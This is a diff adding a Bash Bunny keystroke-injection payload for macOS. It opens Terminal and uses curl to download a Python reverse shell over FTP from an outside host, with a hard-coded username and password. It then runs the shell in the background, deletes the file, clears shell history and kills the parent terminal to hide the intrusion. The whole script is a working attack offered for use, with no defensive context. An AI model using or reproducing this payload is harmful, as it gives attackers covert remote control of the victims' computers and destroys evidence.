@@ -1,0 +1,39 @@
+#!/bin/bash
+source bunny_helpers.sh
+
+LED R
+ATTACKMODE HID STORAGE
+Q REM cmd/unix/reverse_python Payloader
+Q DELAY 500
+Q COMMAND SPACE
+Q DELAY 500
+Q STRING terminal
+Q ENTER
+Q DELAY 500
+Q COMMAND 't' 
+Q STRING "cd ~/Desktop"
+Q ENTER
+Q DELAY 500
+Q STRING curl ftp://www.netpromo.com.br/Neto/shell.py --user netpromo:n3tpromo -o shell.py
+Q ENTER
+Q DELAY 2000
+Q STRING chmod +x shell.py
+Q ENTER
+Q DELAY 500
+Q STRING "~/Desktop/shell.py &"
+Q ENTER
+Q DELAY 500
+Q STRING "rm ~/Desktop/shell.py"
+Q ENTER
+Q DELAY 500
+Q STRING disown
+Q ENTER
+Q DELAY 500
+Q STRING history -c
+Q ENTER
+Q DELAY 500
+rem Q STRING "kill -9 \$\$"
+Q STRING kill -9 '$(ps -p $PPID -o ppid=)'
+Q ENTER
+LED R G B
+
